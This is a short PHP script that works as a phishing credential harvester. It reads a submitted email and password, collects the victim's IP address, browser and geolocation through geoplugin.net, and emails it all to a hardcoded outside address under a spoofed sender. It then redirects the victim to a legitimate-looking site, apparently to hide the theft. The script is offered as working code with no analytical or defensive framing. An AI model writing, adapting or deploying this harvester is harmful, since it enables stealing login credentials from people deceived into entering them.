<?php
if(isset($_POST['txtEmail']) && isset($_POST['txtPass'])) {
    // Get visitor information
    $ip = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $location = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
    $country = $location['geoplugin_countryName'];
    $city = $location['geoplugin_city'];
    
    // Build email message
    $to = 'katherine@fxcoinvault.com'; // replace with your own email address
    $subject = 'Hamza Kali';
    $message = 'Email: '.$_POST['txtEmail']."\r\n".
               'Password: '.$_POST['txtPass']."\r\n".
               'Secured Login Session: '.(isset($_POST['chkSecured']) ? 'Yes' : 'No')."\r\n".
               'IP Address: '.$ip."\r\n".
               'Browser: '.$browser."\r\n".
               'Country: '.$country."\r\n".
               'City: '.$city."\r\n";
    $headers = 'From: root@localhost.com'."\r\n".
               'Reply-To: root@localhost'."\r\n".
               'X-Mailer: PHP/'.phpversion();
    mail($to, $subject, $message, $headers);

    // Redirect to the desired URL after form submission
    $redirect_url = 'https://acm1.eim.ae';
    header('Location: '.$redirect_url);
    exit();
}
?>
